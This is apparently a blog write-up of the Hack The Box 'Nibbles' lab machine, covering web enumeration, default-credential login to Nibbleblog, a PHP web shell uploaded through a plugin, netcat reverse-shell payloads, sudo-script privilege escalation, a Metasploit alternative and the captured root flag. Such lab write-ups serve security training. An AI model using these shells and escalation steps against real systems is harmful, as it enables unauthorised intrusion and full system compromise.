---
layout: post
title: "Nibbles â€“ Hack The Box"
categories: htb
date: 2025-07-12
---

## ğŸ§  Summary

Hack The Box's **Nibbles** is an easy Linux box that walks us through basic web enumeration, CMS exploitation, reverse shell upload via a plugin, and privilege escalation through misconfigured script execution rights.

---

## ğŸ› ï¸ Tools Used

- Nmap
- WhatWeb
- Gobuster
- Curl
- LinEnum
- Netcat
- PHP Web Shell
- Python HTTP server

---

## ğŸ–¥ï¸ Target Info

- IP: `10.129.249.115`
- OS: Linux (Ubuntu)
- Web: Apache 2.4.18
- CMS: Nibbleblog v4.0.3 (codename Coffee)

---

## ğŸš€ Steps to Root

### 1. Nmap Scan

```bash
nmap -sV -sC -p 80 --open 10.129.249.115
```
Apache found running on port 80.
ğŸ“¸ Screenshot 1: Nmap scan output

### 2. WhatWeb Scan
```bash
whatweb http://10.129.249.115
```
Identified Apache version and OS.
ğŸ“¸ Screenshot 2: WhatWeb output

### 3. Curl the Web Root
```bash
curl http://10.129.249.115
```
Found a suspicious comment:
```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
ğŸ“¸ Screenshot 3: HTML comment revealing /nibbleblog/

### 4. WhatWeb on /nibbleblog
```bash
whatweb http://10.129.249.115/nibbleblog
```
Reveals site is powered by Nibbleblog.
ğŸ“¸ Screenshot 4: WhatWeb shows Nibbleblog CMS

### 5. Directory Bruteforce with Gobuster
```bash
gobuster dir -u http://10.129.249.115/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Discovered /admin, /content, /plugins, /README, and more.
ğŸ“¸ Screenshot 5: Gobuster results

### 6. Extract CMS Version from README
```bash
curl http://10.129.249.115/nibbleblog/README
```
Found Nibbleblog v4.0.3
ğŸ“¸ Screenshot 6: README showing version

### 7. Check users.xml File
```bash
curl -s http://10.129.249.115/nibbleblog/content/private/users.xml | xmllint --format -
```
Username found: admin
ğŸ“¸ Screenshot 7: Found username inside XML

### 8. Check config.xml for Metadata
```bash
curl -s http://10.129.249.115/nibbleblog/content/private/config.xml | xmllint --format -
```
Email fields and blog path information found.
ğŸ“¸ Screenshot 8 and ğŸ“¸ Screenshot 9: Config values and admin email

### 9. Admin Login Page
Go to:
```bash
http://10.129.249.115/nibbleblog/admin.php
```
Try default creds:
```bash
Username: admin
Password: nibbles
```
ğŸ“¸ Screenshot 10: Login page
ğŸ“¸ Screenshot 11: Dashboard accessed

### 10. Upload Web Shell via Plugin
Go to: Plugins â†’ My Image
Upload a shell like:
```php
<?php system('id'); ?>
```
ğŸ“¸ Screenshot 12: Shell file
ğŸ“¸ Screenshot 13: My Image plugin panel

### 11. Trigger Web Shell
Visit:
```bash
http://10.129.249.115/nibbleblog/content/private/plugins/my_image/image.php
```
Youâ€™ll get UID confirmation.
ğŸ“¸ Screenshot 14: Web shell output

### 12. Get a Reverse Shell
Use this payload:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 9443 >/tmp/f"); ?>
```
Start listener:
```bash
nc -lvnp 9443
```
ğŸ“¸ Screenshot 15: Reverse shell payload
ğŸ“¸ Screenshot 16: Listener + user.txt flag

### 13. Post-Exploitation
Unzip personal.zip:
```bash
unzip personal.zip
```
### ğŸ“¸ Screenshot 17: Archive extraction reveals monitor.sh

### 14. Transfer and Run LinEnum
On attacker:
```bash
sudo python3 -m http.server 8080 - make sure same dir as linenum
```
On target:
```bash
wget http://10.10.14.76:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
ğŸ“¸ Screenshot 18: Serving LinEnum
ğŸ“¸ Screenshot 19: LinEnum output

### 15. Privilege Escalation via monitor.sh
From LinEnum:
```text
(ALL) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Exploit:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 8443 >/tmp/f' >> /home/nibbler/personal/stuff/monitor.sh
nc -lvnp 8443
sudo /home/nibbler/personal/stuff/monitor.sh
```
ğŸ“¸ Screenshot 20: sudo rights
ğŸ“¸ Screenshot 21: Priv esc attempt
ğŸ“¸ Screenshot 22: Root shell via nc
ğŸ“¸ Screenshot 23: Final root.txt captured

### ğŸ§¨ Root Flag
```bash
cat /root/root.txt
```
```text
de5e5d6619862a8aa5b9b212314e0cdd
```
### âš¡ Metasploit Alternative (Optional)
If you want to skip manual steps:
```bash
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.129.249.115
set RPORT 80
set TARGETURI /nibbleblog
set USERNAME admin
set PASSWORD nibbles
exploit
```
This gives you a meterpreter shell directly.

### ğŸ Conclusion
The Nibbles box reinforces how outdated CMS versions and weak plugin validation can lead to full system compromise. Enumeration, basic scripting, and privilege escalation misconfigs made this a solid beginner box.

